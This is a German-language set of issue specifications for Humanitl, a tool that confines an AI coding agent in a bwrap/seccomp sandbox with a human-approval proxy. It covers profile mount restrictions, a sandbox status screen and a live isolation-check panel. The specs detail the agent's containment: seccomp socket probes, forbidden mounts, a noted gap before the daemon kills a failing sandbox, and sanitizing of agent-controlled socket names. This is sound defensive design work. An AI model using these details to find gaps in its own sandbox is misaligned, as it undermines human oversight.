Sicherheitsregel: Ein Projekt-Profil darf `sandbox.mounts.extra_ro`/`extra_rw` nicht setzen (sonst könnte ein Repository beim Öffnen Host-Pfade in die Sandbox holen). Enthält `.humanitl/profile.toml` diese Schlüssel, liefert `resolve` `CONFIG_003` (Blocking): "The project profile tries to mount host paths. Only global profiles may do that." Ebenso verboten im Projekt-Profil: `agent.command`, `sandbox.profile` (der bwrap-Profilname), `hold.ask_mode = "none"` ist erlaubt.

Diagnostics: `CONFIG_001` (Blocking) Profil nicht gefunden, `fix: CopyCommand("humanitl config schema --profiles")`; `CONFIG_002` (Blocking) TOML-Parse-Fehler mit Zeile/Spalte; `CONFIG_003` wie oben; `CONFIG_004` (Warning) Projekt-Profil vorhanden, aber Verzeichnis nicht dem Nutzer gehörend (Datei eines Fremden).

### Schritte
1. `ConfigOverlay` per Makro oder manuell als Option-Spiegel von `Config`; Merge-Funktion `Config::apply(&mut self, &ConfigOverlay, origin)` mit Origin-Tracking. Tests.
2. `Profile`-Loader: Datei lesen, `name` validieren (`^[a-z0-9-]{1,32}$`), eingebettete Profile registrieren.
3. `resolve()` mit der Präzedenz-Kette, Projekt-Profil-Verbote.
4. Die zwei Profil-Dateien anlegen, `include_str!` einbinden.
5. CLI: `--profile NAME` in `run` und `sandbox run|argv`; `humanitl config get hold.ask_mode --profile llm-only` zeigt Wert und Origin.
6. `docs/profiles.md` mit Format, Präzedenz, Verboten.

### Tests
- `builtin_profiles_parse`: beide Dateien parsen, Namen stimmen.
- `precedence_global_profile_project_env_cli`: Setze `hold.timeout_secs` auf jeder Ebene mit verschiedenen Werten; Ergebnis ist der CLI-Wert, `origins["hold.timeout_secs"] == Origin::Cli`.
- `project_profile_inherits_named`: `.humanitl/profile.toml` mit `name = "llm-only"` und `[hold] timeout_secs = 7` ⇒ `ask_mode == none`, `timeout_secs == 7`.
- `project_profile_cannot_mount`: `extra_rw` im Projekt-Profil ⇒ `CONFIG_003`.
- `unknown_profile_config_001`.
- `llm_only_blocks_everything_but_passthrough`: RuleSet aus Profil + Adapter; `POST llm-host /v1/chat` ⇒ allow; `GET github.com /` ⇒ block; kein Held.

### Akzeptanzkriterien
- [x] `humanitl config get --profile llm-only hold.ask_mode` ⇒ `none (origin: profile builtin llm-only)`.
- [x] `humanitl config schema --profiles` listet `default`, `llm-only` und alle Dateien unter `profiles/` mit Beschreibung.
- [x] Ein Projekt mit `.humanitl/profile.toml`, das `extra_rw` setzt, verweigert den Start mit `CONFIG_003` in CLI und UI. Die Kommandozeile war gemessen, die Oberfläche nicht; seit dem 2026-09-06 misst `app/test/features/setup/project_profile_test.dart` auch sie: Der Bildschirm bleibt stehen, der Abschnitt wechselt nicht, die Karte trägt `CONFIG_003`, und die Sandbox läuft nicht. **Nachtrag 2026-09-12, zwei Angaben genauer:** Für `extra_rw` greift nicht `project_scope_denied`, sondern `project_mount_refused` (`daemon/crates/config/src/load.rs`, `is_mount_key` in der Schleife über die Einträge, Satz „tries to mount host paths from a project profile"); die Kommandozeile misst genau das (`run_refuses_a_project_profile_that_wants_to_mount_host_paths` in `daemon/bin/humanitl/tests/cli.rs`, erwartet „mount host paths"). Der Widget-Test nimmt dagegen eine handgeschriebene Konstante mit dem Wortlaut von `project_scope_denied`, dem Schlüssel `sandbox.extra_rw` (kanonisch ist `sandbox.mounts.extra_rw`) und `Severity.blocking`, während beide Rust-Pfade `Severity::Error` bauen. Er belegt deshalb, dass der Bildschirm irgendeine `CONFIG_003`-Karte zeigt und nicht wechselt, nicht den Satz des Daemons. Fehlender Test: ein App-Test gegen einen echten `humanitld` mit `.humanitl/profile.toml` und `[config.sandbox.mounts] extra_rw`, der auf „mount host paths" prüft.
- [x] `docs/profiles.md` existiert und enthält die Präzedenztabelle.

### Fallstricke
- Overlay-Merge muss feldweise sein, nicht tabellenweise: `[hold]` im Projekt-Profil mit nur `timeout_secs` darf `ask_mode` aus dem benannten Profil nicht auf Default zurücksetzen.
- Listen (`rules.files`, `extra_ro`) werden ersetzt, nicht konkateniert. Dokumentieren.
- Pfade in `rules.files` relativ zur Profil-Datei auflösen, nicht zum cwd.
- `name` im Projekt-Profil darf nicht `default` mit anderem Inhalt „überschreiben"; der Name bezeichnet nur die Basis.

### Referenzen
BACKLOG.md ADR-011, Abschnitt 6 (Profile), 3.5; CONVENTIONS.md 3.7, 3.8.

---

## HUM-040 · Sandbox-Screen
Sprint: 3 · Größe: M · Abhängigkeiten: HUM-019, HUM-008, HUM-018, HUM-066 · Blockiert: HUM-041, HUM-042, HUM-068

### Kontext
Der Sandbox-Screen ist der Ort, an dem der Nutzer sieht, was der Agent bekommt: Projektordner, Modus, Mounts, Env, Status. Usability-Review: der Nutzer fürchtet „bekommt der Agent meine ganze Platte?", also steht dort wörtlich „Der Agent sieht nur `/work` = ~/clients/acme. Nichts sonst." Start/Stop lebt hier; Stop bei laufendem Agent ist eine der wenigen Modal-Bestätigungen (BACKLOG.md Abschnitt 5).

### Ziel
Screen `SandboxScreen` unter `features/sandbox` mit Header (Status, Start/Stop, Profil-Chip), Terminal-Bereich oben (Platzhalter bis HUM-042), Tabs unten: Mounts, Env, Isolation (Platzhalter bis HUM-041), Log. Alle Daten kommen über `sandboxStatusProvider` vom Daemon; einen `configProvider` gibt es nicht (nachgesehen am 2026-09-12: keine Fundstelle unter `app/lib`).

### Nicht-Ziel
Terminal-Inhalt (HUM-042), Isolation-Panel (HUM-041), Diagnostics-Inhalte (HUM-068). Keine Profil-Bearbeitung.

### Betroffene Pfade
- `app/lib/features/sandbox/sandbox_screen.dart` (neu)
- `app/lib/features/sandbox/providers/sandbox_status_provider.dart` (neu)
- `app/lib/features/sandbox/widgets/{sandbox_header.dart, mounts_tab.dart, env_tab.dart, log_tab.dart, stop_dialog.dart, work_dir_picker.dart}` (neu)
- `app/lib/core/domain/sandbox.dart` (neu): `SandboxStatus`, `MountEntry`, `EnvEntry`
- `app/l10n/app_en.arb`, `app_de.arb`: Schlüssel `sandbox_*`
- `proto/humanitl/v1/humanitl.proto`: `SandboxRequest { oneof { Start, Stop, Status } }`, `SandboxEvent { oneof { Status, LogLine, IsolationResult, Diagnostic } }`, `SandboxStatus { state; session_id; started_at; profile; work_dir_host; work_mode; repeated Mount mounts; repeated EnvVar env; string argv_preview }`
- `app/test/features/sandbox/*_test.dart`

### Spezifikation

Domain:

```dart
@freezed
class SandboxStatus with _$SandboxStatus {
  const factory SandboxStatus({
    required SandboxState state,            // stopped | starting | running | stopping | failed
    SessionId? sessionId,
    DateTime? startedAt,
    required String profile,
    String? workDirHost,
    required WorkMode workMode,             // ro | rw
    required List<MountEntry> mounts,       // dst, src?, mode (ro|rw|tmpfs|masked), origin (profile|adapter|session)
    required List<EnvEntry> env,            // key, value, origin, secret(bool) -> value rendered as ••••
    required String argvPreview,            // full bwrap argv, one string
    required List<Diagnostic> diagnostics,
  }) = _SandboxStatus;
}
```

Widget-Baum:

```
SandboxScreen
└─ Column
   ├─ SandboxHeader (40px)
   │  ├─ HStatusDot(state) + Text(sandbox_state_<state>)
   │  ├─ HChip(profile)               // "default" · click -> Settings
   │  ├─ Spacer
   │  ├─ WorkDirPicker (compact)       // "~/clients/acme · rw"  click -> file_picker + ro/rw toggle; disabled while running
   │  └─ HButton.primary(Start) | HButton.secondary(Stop)
   ├─ HResizable(vertical, initial 0.6)
   │  ├─ TerminalPane (placeholder: HPanel with sandbox_terminal_placeholder)
   │  └─ HTabs [Mounts, Env, Isolation, Log]
   │     ├─ MountsTab: sentence + TableView(dst, src, mode, origin)
   │     ├─ EnvTab: TableView(key, value|••••, origin), search field, "reveal" per row (toggle, no clipboard)
   │     ├─ IsolationTab: placeholder (HUM-041)
   │     └─ LogTab: ListView.builder of LogLine (mono 12), auto-scroll with pause on user scroll
   └─ HStatusBar: session id short, uptime, "argv anzeigen" link -> Sheet with argvPreview (mono, selectable, copy)
```

Satz in `MountsTab` (ARB `sandbox_mounts_sentence`): en "The agent sees only `/work` = {hostPath} ({mode}). Nothing else from this machine." de "Der Agent sieht nur `/work` = {hostPath} ({mode}). Sonst nichts von diesem Rechner." Wenn `extra_ro`/`extra_rw` aus einem globalen Profil aktiv sind, wird der Satz ergänzt: en "Plus {n} additional path(s) from your profile:" gefolgt von der Liste.

Start-Ablauf: Klick auf Start ⇒ `Sandbox(Start { profile, work_dir, work_mode })` ⇒ Daemon streamt `Status(starting)`, dann `IsolationResult` × 3 (HUM-041), dann `Status(running)` oder `Diagnostic` + `Status(failed)`. Der Start-Button ist deaktiviert, wenn `diagnosticsProvider` ein `Blocking` enthält, und zeigt Tooltip mit dessen `title`.

Stop-Dialog (einzige Modal in diesem Screen): Titel `sandbox_stop_title` ("Stop the agent?"), Body `sandbox_stop_body` ("The agent is running. Stopping ends its session; unsaved work inside the agent's terminal is lost. Files in /work stay."), Buttons „Abbrechen" (default focus), „Stoppen" (destructive). Ist `state == running` und kein Agent-Prozess mehr aktiv (Exit erkannt), wird ohne Dialog gestoppt.

`WorkDirPicker`: `file_picker.getDirectoryPath()`, danach Toggle `ro | rw` (Default aus Profil). Schreibt `sandbox.work_dir`, `sandbox.work_mode` über `configProvider.set(...)` (Origin `Cli`-äquivalent „UI", persistiert in `config.toml`). Deaktiviert bei `running`.

**Seit der Umsetzung überholt (nachgetragen 2026-09-12):** Einen `configProvider` gibt es nicht — keine Fundstelle unter `app/lib` —, und `GetConfig` antwortet weiter `unimplemented` (`daemon/crates/ipc/src/server.rs`, `get_config`, wartet auf HUM-069). Der Picker schreibt deshalb nichts: Er liegt als `app/lib/core/ui/work_dir_picker.dart`, und der gewählte Ordner geht über `sandboxStatusProvider.plan(workDir: …)` in `Sandbox(Plan)` und `Sandbox(Start)`, wo der Dienst ihn für die laufende Sitzung merkt (CONVENTIONS 4.17). Gemessen in `workdir_picker_asks_the_daemon_instead_of_computing` (`app/test/features/sandbox/sandbox_screen_test.dart:233`).

### Schritte
1. Proto-Messages ergänzen, Codegen. Daemon: `Sandbox`-RPC-Handler liefert `Status` aus dem laufenden `SessionManager`.
2. Domain-Typen in Dart (freezed), Mapping aus Proto.
3. `sandboxStatusProvider` als `StreamNotifier`, der bei `Subscribe`-Verbindung `Sandbox(Status)` anfragt und Events einarbeitet.
4. Header, Picker, Tabs, Stop-Dialog. Alle Strings in ARB.
5. Widget-Tests mit `FakeDaemonClient`.
6. Golden: Header in `stopped`, `running`, `failed`.

### Tests
- `start_button_disabled_when_blocking_diagnostic`.
- `stop_shows_dialog_when_running`, `stop_without_dialog_when_agent_exited`.
- `mounts_sentence_renders_host_path_and_mode`.
- `env_tab_masks_secret_values`: Env-Eintrag mit `secret: true` rendert `••••`, Reveal-Toggle zeigt Wert, kein Copy-Button.
- `argv_sheet_shows_full_command`: Sheet enthält `--unshare-all`.
- `workdir_picker_disabled_while_running`.

### Akzeptanzkriterien
- [x] `flutter test test/features/sandbox` grün.
- [x] Manuell mit echtem Daemon: Start zeigt innerhalb 2 s `running`, Mounts-Tab listet `/work`, `/run/humanitl/proxy.sock`, `/etc/humanitl/ca.crt`, Env-Tab listet `HTTP_PROXY`. **Seit dem 2026-09-07 gemessen statt von Hand geprüft, und die Messung ist ein Lauf, den jeder wiederholen kann:** `make flutter-test-daemon` startet einen echten `humanitld` in einem eigenen XDG-Verzeichnis, hängt die echten Provider der Anwendung über den echten gRPC-Client daran und startet eine echte Sandbox mit `bwrap` (`app/test/features/sandbox/daemon_live_test.dart`). Drei Zusicherungen: `a_real_start_is_running_within_two_seconds` -- gemessen wird die Zeit **bis der Provider `running` meldet** und nicht die Dauer des Aufrufs, denn `start()` läuft bis zum Ende des Stroms und das ist die Lebenszeit der Sitzung; gemessen 80, 85 und 270 ms in drei Läufen bei einem Budget von 2 s -- eine Messung dieses Rechners, keine Konstante, dazu die Fragen, ob der Übergang überhaupt gemeldet wurde und ob die Zeit über null liegt, weil eine einseitige Frist eine Null durchgehen ließe, `a_real_start_mounts_the_three_paths_the_screen_names` (die drei Pfade, und `/work` zeigt wirklich auf das gewählte Verzeichnis), `a_real_start_carries_the_proxy_in_the_environment` (`HTTP_PROXY` steht da und zeigt auf `127.0.0.1`). Mutationsproben: Budget auf 1 ms, erster Test rot; einen vierten Pfad in die Liste der erwarteten Mounts, zweiter Test rot; die gemessene Zeit durch `Duration.zero` ersetzt, erster Test rot (die erste Fassung dieses Tests hat genau das durchgehen lassen und ist daran verbessert worden); und die schärfste: `sandbox.start()` ganz entfernt, also nur `plan` ohne laufende Sandbox -- alle drei Tests rot. Auch diese Probe kommt aus dem Review: Gegen die erste Fassung blieben Test 2 und 3 dabei **grün**, weil `plan` dieselben Mounts liefert; seitdem fragen beide zuerst nach `state == running` und einer Sitzungskennung. Der Test wartet außerdem nicht mehr auf das Ende des Starts, sondern auf den Übergang nach `running`: `Sandbox(Start)` hält seinen Strom bis zum Ende des Agenten offen, und auf einem Rechner mit einem echten OpenCode im Sandbox-PATH hinge der Lauf sonst. Gemessen mit `[agent] command = ["sleep", "45"]`: 5,7 s statt 45 s. Der Test läuft nicht in `make check`: Er startet einen Dienst und eine Sandbox, und beides gehört nicht in ein Gate, das auf jedem Rechner in Sekunden grün sein soll — dieselbe Trennung wie bei `make flutter-test-dbus` (HUM-118). **Was er nicht misst:** Pixel. Ob die drei Mounts im Reiter untereinander stehen und die Zeile mit `HTTP_PROXY` lesbar ist, sagen die Goldens und ein Auge, nicht dieser Test.
- [x] Goldens für drei Header-Zustände abgelegt.
- [x] Stop bei laufendem Agent verlangt Dialog, `Esc` bricht ab.

### Fallstricke
- Env-Werte können Secrets enthalten (spätere Credential-Injection). `secret: true` wird vom Daemon gesetzt für Schlüssel, die auf `_TOKEN`, `_KEY`, `_SECRET`, `PASSWORD` enden. Nie in Logs.
- `argvPreview` kann 2 KB lang sein; Sheet mit `SelectableText` und horizontalem Scroll, kein Umbruch mitten in Pfaden.
- Der Picker liefert unter Wayland-Portalen manchmal `null` bei Abbruch; `null` ist kein Fehler.
- Tabs behalten Scrollposition (`AutomaticKeepAliveClientMixin` oder `PageStorageKey`).

### Referenzen
BACKLOG.md Abschnitt 5 (IA, Modal-Regel, Usability §1 Projektordner); CONVENTIONS.md 3.9 und 4.17 (der Ordnerwunsch reist in `Plan`/`Start`, es gibt keinen Schreibweg in die Konfiguration). file_picker (https://pub.dev/packages/file_picker).

---

## HUM-041 · Isolation-Check-Panel und Ring
Sprint: 3 · Größe: L · Abhängigkeiten: HUM-011, HUM-012, HUM-013, HUM-039, HUM-040 · Blockiert: HUM-044, HUM-046, HUM-067, HUM-068

### Kontext
Die drei Garantien (BACKLOG.md 4.1) sind nur dann ein Argument, wenn der Nutzer sie live sehen kann. Usability: der Check ist der Reassurance-Moment bei jedem Start, drei Zeilen animieren auf grün, eine vierte amber Zeile zeigt die LLM-Ausnahme. Der Ring im Header (Signature-Element 2) ist das Produktversprechen, immer sichtbar. Fehlschlag deaktiviert den Start, nie „trotzdem starten".

### Ziel
Der Daemon liest beim Session-Start die Prüfzeilen des Shims aus der laufenden Sandbox (nicht aus dem Host), faltet sie zu den drei Garantien und streamt sie als `SandboxEvent.check` (`CheckResult`, `proto/humanitl/v1/humanitl.proto`); das UI zeigt Panel und Ring. Der Ring hat drei Segmente, jedes Segment entspricht einer Prüfung. Fällt eine Prüfung aus oder fehlt der Bericht, beendet der Daemon die Sandbox und meldet `Status(failed)` mit dem Befund. **Beendet, nicht verhindert:** der Shim meldet nur und startet den Agenten unmittelbar danach (Punkt 4 der Spezifikation), der Daemon liest den Bericht erst dann. Zwischen dem Start des Agenten und dem `SIGKILL` liegt ein Fenster, in dem Brücke und Proxy stehen; seine obere Schranke und das Restrisiko stehen in `docs/THREAT-MODEL.md` unter K-15 und in `docs/SECURITY.md` 6b. `enforce_isolation` in `daemon/bin/humanitl/src/cmd/sandbox.rs` und `escape-launch` sind an derselben Stelle gebaut und ebenso wenig fail-closed; keiner der drei Wege verhindert den Befehl.

### Nicht-Ziel
Keine Prüfungen der Regel-Engine oder des Proxys (ESC-3/4 sind CI-Tests, nicht Laufzeit). Kein periodisches Re-Checking im MVP (Post-MVP: alle 60 s). Keine Änderung am Shim-Vertrag aus CONVENTIONS 4.12: kein neues Argument, kein neues Zeilenformat, keine Erzwingung im Shim.

### Betroffene Pfade
- `daemon/crates/ipc/src/sandbox.rs`: `Op::IsolationCheck` ruft `BwrapBackend::isolation_check` auf dem gehaltenen Handle statt den Schnappschuss zu liefern; `Inner::start` sendet die drei `SandboxEvent.check` zwischen `Status(starting)` und `Status(running)` und beendet die Sandbox bei einem roten oder fehlenden Ergebnis, ohne `Status(running)` zu senden
- `daemon/crates/ipc/src/convert.rs`: `CheckResult` nach Proto, Säuberung der `evidence`
- `daemon/crates/ipc/tests/fake_parity.rs`: der Fake (`daemon/crates/ipc/src/fake/mod.rs`, `isolation_checks()`) sendet die drei Ereignisse schon; echter Dienst und Fake müssen dieselbe Form liefern
- `app/lib/core/domain/sandbox.dart`: `IsolationCheckResult`, `SandboxUpdate.check`, `SandboxStatus.checks`
- `app/lib/core/ipc/convert.dart`, `daemon_client.dart`, `grpc_daemon_client.dart` (der Zweig `SandboxEvent_Event.check_2` verwirft das Ereignis heute), `fake_daemon_client.dart`
- `app/lib/features/sandbox/widgets/isolation_panel.dart` (neu): ersetzt das `ComingPane` des Reiters `SandboxTab.isolation` in `sandbox_screen.dart`
- `app/lib/features/shell/widgets/header_bar.dart`: `IsolationRingPlaceholder` und `_RingPainter` werden an Ort und Stelle zustandsgesteuert; das Semantik-Label `shellIsolationUnknown` bleibt für den grauen Zustand
- `app/l10n/app_en.arb`, `app_de.arb`: `isolationCheck1..3`, `isolationException`, `isolationExceptionNone`, `isolationShowArgv` (camelCase, CONVENTIONS 4.11); `sandboxIsolationPlaceholder` entfällt
- `tests/escape/esc-1-sockets.sh`, `esc-2-mounts.sh`: unverändert; sie messen dieselben Tatsachen unabhängig von innen und bleiben das

Gestrichen gegenüber der ersten Fassung: `daemon/crates/sandbox/src/isolation.rs` (die Auswertung steht seit HUM-011 in `bwrap.rs::isolation_check`), „`bwrap.rs`: Report-Pipe" (steht: `LaunchOnce.report`, `read_report`), `daemon/bin/humanitl-shim/src/main.rs` (die Prüfungen sind da, dieses Issue ändert am Shim nichts), `app/lib/app.dart` (48 Zeilen, hält keinen Header), `providers/isolation_check_provider.dart` (die Ergebnisse kommen über `sandboxStatusProvider`).

### Spezifikation

**Was schon steht (HUM-011, HUM-012, HUM-013; CONVENTIONS 4.12), und woran sich dieses Issue hält:**

1. Der Shim wird als `humanitl-shim --proxy-port <port> -- <cmd>` gestartet; Brücken, Filtertabelle und der Berichts-Deskriptor kommen aus der Umgebung (`HUMANITL_BRIDGES`, `HUMANITL_SECCOMP_*`, `HUMANITL_REPORT_FD`), nie aus der Kommandozeile, damit keine Sicherheitsentscheidung in `/proc/<pid>/cmdline` steht. Jede andere Option endet mit Exit 125 (`daemon/bin/humanitl-shim/src/main.rs`, `parse_cli`). Der Shim ist nicht PID 1 der Sandbox; das ist bwraps Init (kein `--as-pid-1`, CONVENTIONS 4.11).
2. Der Shim bindet die Brücke selbst (`bridge.rs`, `std::net::TcpListener`) und verbindet sich einmal zu sich selbst (`self_connect`). Kein socat, keine `connect()`-Warteschleife.
3. Er schreibt **fünf** Zeilen im Format `CHECK <name> <ok|fail> <evidence>` (je eine `write(2)`, `report.rs`): `bridge_listening`, `no_interfaces`, `single_socket` vor dem seccomp-Filter, `seccomp_applied` und `families` aus dem gefilterten Kind danach. Kein JSON. `no_interfaces` liest `/sys/class/net` und fällt nur im Fehlerfall auf `/proc/net/dev` zurück. `single_socket` ist ein sortierter Breitensuchlauf in Rust std über das Dateisystem der Sandbox (`SOCKET_WALK_MAX_DEPTH` = 3, höchstens 2000 Einträge, ohne `/proc`, `/sys` und `/dev` außer `/dev/shm`) und meldet `sockets=…;unexpected=…;entries=N;limit=none|entries|depth`. Kein `/proc/net/unix`, kein `nftw`, keine Prüfung auf `daemon.sock` oder `$XDG_RUNTIME_DIR` (das ist ESC-2). `families` probt `socket(AF_UNIX,SOCK_STREAM)`, `socket(AF_INET,SOCK_DGRAM)`, den x32-Socket-Syscall und `io_uring_setup` (alle `EPERM`) sowie `socket(AF_INET,SOCK_STREAM)` (ok). Eine `socketpair`-Probe gibt es nicht; Beleg für „`socketpair` bleibt erlaubt" sind allein `filter_allows_socketpair` in `seccomp.rs` und ESC-1.
4. Der Shim erzwingt nichts: Prüfung 1 und 2 werden gemeldet, der Agent wird trotzdem gestartet. Exit-Codes des Shims sind 125, 126, 127; ein „Exit 3 ohne exec" gibt es nicht. Fail-closed ist Sache des Hosts.
5. `BwrapBackend::isolation_check(&SandboxHandle)` (`daemon/crates/sandbox/src/bwrap.rs`) faltet die fünf Zeilen zu drei `CheckResult { check, passed, evidence, diagnostic }` (CONVENTIONS 3.4): `no_interfaces` ⇒ `NoNetworkInterface`, `single_socket` + `bridge_listening` ⇒ `SingleSocket`, `seccomp_applied` + `families` ⇒ `SeccompActive`; beide Quellzeilen stehen in der `evidence`. Eine fehlende Zeile gilt als `passed: false`. Gemessen mit `humanitl sandbox check --json` am 2026-09-04:

```
no_interfaces ok: lo
single_socket ok: sockets=/run/humanitl/proxy.sock;unexpected=none;entries=2000;limit=entries; bridge_listening ok: proxy=127.0.0.1:3128->/run/humanitl/proxy.sock
seccomp_applied ok: Seccomp:2;NoNewPrivs:1; families ok: socket(AF_UNIX,SOCK_STREAM)=EPERM;socket(AF_INET,SOCK_DGRAM)=EPERM;x32:socket=EPERM;io_uring_setup=EPERM;socket(AF_INET,SOCK_STREAM)=ok
```

| Ergebnis | Diagnostic (registriert in `codes.rs`, erzeugt in `bwrap.rs`) |
|---|---|
| kein Bericht (Zeile fehlt, Shim abgestürzt) | `SANDBOX_013` (Blocking), alle fehlenden Prüfungen `passed: false` |
| Check 1 fehlgeschlagen | `SANDBOX_014` (Blocking) |
| Check 2 fehlgeschlagen | `SANDBOX_015` (Blocking) |
| Check 3 fehlgeschlagen | `SANDBOX_016` (Blocking) |

`SANDBOX_010..012` sind Starter-Fehler (Argumentliste, Platzhalter, Kommandozeile) und bleiben es (CONVENTIONS 4.11). Titel und `fix` der vier Codes stehen in `bwrap.rs` und `codes.rs`; dieses Issue erfindet keine neuen.

**Neu in diesem Issue, Daemon:** `SandboxService` (`daemon/crates/ipc/src/sandbox.rs`) ruft nach `launch` `isolation_check` auf dem gehaltenen Handle, sendet je Ergebnis ein `SandboxEvent.check`, dann `Status(running)`. Ist ein Ergebnis `passed: false` oder fehlt der Bericht: `handle.kill()`, das `Diagnostic` des Ergebnisses als `SandboxEvent.diagnostic`, `Status(failed)`. `Op::IsolationCheck` antwortet mit denselben drei Ereignissen der laufenden Sandbox statt mit dem Schnappschuss; ohne laufende Sandbox sagt die Antwort das, statt drei graue Ergebnisse zu senden. In `convert.rs` läuft `evidence` durch eine Säuberung nach dem Muster von `humanitl_core::sanitize_note` (`block.rs`: Steuerzeichen, Zero-Width, Bidi-Marken entfernen, Länge deckeln), denn der Suchlauf läuft bis Tiefe 3 auch über `/work`, und ein Socket-Dateiname dort stammt vom Agenten; die Säuberung des Shims (`report::sanitize`) ersetzt nur Whitespace und `Cc`, und `parse_check_line` (`bridge_env.rs`) prüft nichts nach.

**Vierte Zeile (Ausnahme):** kein Check, sondern `SandboxStatus.llmEndpoint` aus `sandboxStatusProvider` (`Status.llm_endpoint` der Proto, gefüllt in `ipc/src/sandbox.rs`). Wenn kein Endpoint gesetzt ist, zeigt die Zeile „Keine LLM-Ausnahme konfiguriert" in grau. Einen `configProvider` gibt es nicht; `GetConfig` bleibt bis HUM-069 unimplementiert.

Panel-Layout (`IsolationTab`, Evidenz in Mono 11, rechts):

```
┌ Isolation ────────────────────────────────────────────────┐
│ ● No network interface. There is nowhere for traffic to go. │  no_interfaces ok: lo
│ ● Exactly one door: a socket that leads to Humanitl.        │  single_socket ok: sockets=/run/humanitl/proxy.sock;… ; bridge_listening ok: …
│ ● The kernel opens no new door (seccomp).                   │  seccomp_applied ok: Seccomp:2;NoNewPrivs:1; families ok: …
│ ◐ Exception: LLM at 192.168.1.50:11434 — passthrough,       │  [change]
│   logged, never held.                                       │
│                                                             │
│ ▸ Show the exact sandbox command                            │
└─────────────────────────────────────────────────────────────┘
```

Trägt die Zeile `single_socket` ein `limit=entries` oder `limit=depth` — auf dem Entwicklungsrechner ist das heute der Fall —, sagt das Panel, dass der Suchlauf früh abgebrochen hat, statt ein glattes Grün zu zeigen (CONVENTIONS 4.13, „Nie mehr behaupten als bewiesen ist"). Der erschöpfende Beweis bleibt ESC-2.

Strings (ARB `isolationCheck1..3`, `isolationException`, `isolationExceptionNone`, `isolationShowArgv`); der Wortlaut ist der aus `docs/SECURITY.md` Abschnitt 1 und BACKLOG.md 4.1, wortgleich:
- en 1: "No network interface. There is nowhere for traffic to go." / de: "Kein Netzwerk-Interface. Es gibt keinen Weg nach draußen."
- en 2: "Exactly one door: a socket that leads to Humanitl." / de: "Genau eine Tür: ein Socket, der zu Humanitl führt."
- en 3: "The kernel opens no new door (seccomp)." / de: "Der Kernel öffnet keine neue Tür (seccomp)."
- en Ausnahme: "Exception: LLM at {endpoint} — passthrough, logged, never held." / de: "Ausnahme: LLM unter {endpoint}, Passthrough, geloggt, nie angehalten."

Animation: Zeilen erscheinen nacheinander mit 120 ms Versatz, Punkt wechselt von `fg-2` auf `allowed`-Grün mit 200 ms Fade, wenn das Ergebnis eintrifft. Fehlschlag: Punkt `blocked`-Rot, Zeile bekommt darunter die `HDiagnosticCard` (`app/lib/core/ui/h_diagnostic_card.dart`) mit `FixControl`. Evidence in `fg-2`, Mono 11, rechts, ohne Bidi-Umordnung.

Ring (`IsolationRing`, 20 px, im Header rechts neben dem Sandbox-Glyph): `_RingPainter` in `header_bar.dart` behält seine Geometrie (drei Bögen, 2 px, Lücken 0,35 rad). Segment-Farbe: `fg-2` (unbekannt/gestoppt), `allowed` (bestanden), `blocked` (fehlgeschlagen), `held`-Amber pulsierend (läuft). Klick ⇒ `NavIntent(Section.sandbox.index)` (Index 3, `Ctrl+4`; `app/lib/features/shell/section.dart`), nie die Ziffer hart, und Wunsch nach dem Reiter Isolation. Tooltip: „3/3 Isolation checks passed" oder „Isolation check failed: {title}".

### Schritte
1. Daemon: `Inner::start` und `Op::IsolationCheck` in `daemon/crates/ipc/src/sandbox.rs`, Konvertierung und Säuberung in `convert.rs`. Tests: fehlender Bericht ⇒ drei `passed: false`, `SANDBOX_013`, `Status(failed)`; roter Check ⇒ `Diagnostic` (Blocking) und `failed`; `fake_parity.rs` gegen `fake/mod.rs`. Säuberungstest mit einem Socket-Pfad, der U+202E trägt, und einem mit 4 KiB Füllung.
2. Dart-Domäne (`IsolationCheckResult`, `SandboxUpdate.check`, `SandboxStatus.checks`), Konvertierung, der Zweig in `grpc_daemon_client.dart`, der Fake. Geteilte Dateien: unmittelbar vor jedem Schreiben neu lesen, nur anhängen (CLAUDE.md).
3. ARB-Schlüssel in beiden Dateien mit `@`-Beschreibung.
4. Panel, Ring, Header-Einbindung.
5. Widget-Tests und Goldens.

Gestrichen: „Escape-Tests verwenden `humanitl sandbox check --json`". ESC-1 und ESC-2 messen von innen (`esc-2-mounts.sh`: `exactly_one_socket`, `socket_is_proxy`); sie durch den Selbstbericht des Daemons zu ersetzen, nähme der Suite ihre Unabhängigkeit.

### Tests
- Daemon: `start_with_failing_report_yields_checks_and_failed`, `missing_report_yields_sandbox_013`, Parität in `fake_parity.rs`.
- Sandbox-Integration (bwrap, wie `daemon/crates/sandbox/tests/launcher.rs`, grün übersprungen ohne bwrap): Normalstart ⇒ drei `passed: true`. Roter Fall: eine Unix-Socket-Datei, die vor dem Start im Projektverzeichnis liegt ⇒ `single_socket fail` ⇒ `SANDBOX_015`, Sandbox beendet. Die erste Fassung wollte dafür `/tmp/.X11-unix` einhängen; das lehnt schon das Profil mit `SANDBOX_006` ab (`FORBIDDEN_MOUNTS`, `profile.rs`), Check 2 ist auf diesem Weg unerreichbar.
- Widget: Panel zeigt drei Zeilen grün nach drei Events; Fehlschlag zeigt Diagnostic-Karte; graue vierte Zeile ohne Endpoint; `limit=entries` wird als Abbruch gezeigt; Ring-Painter-Golden für 0/3, 3/3, 1 rot.

Die Shim-Parser-Tests der ersten Fassung (`parse_proc_net_dev_only_lo`, `parse_proc_net_unix_filters_abstract`) entfallen: `/proc/net/unix` wird nicht gelesen, und `report.rs` hat seine drei Tests seit HUM-012.

### Akzeptanzkriterien
- [x] `humanitl sandbox check --json` liefert drei Objekte mit `passed: true` auf dem Entwicklungsrechner. Erfüllt seit HUM-011/012/013, gemessen 2026-09-04; kein Beitrag dieses Issues.
- [x] Dieselben drei Ergebnisse kommen über `Sandbox(Start)` und `Sandbox(IsolationCheck)` als `SandboxEvent.check` und stehen mit ihrer `evidence` im Panel.
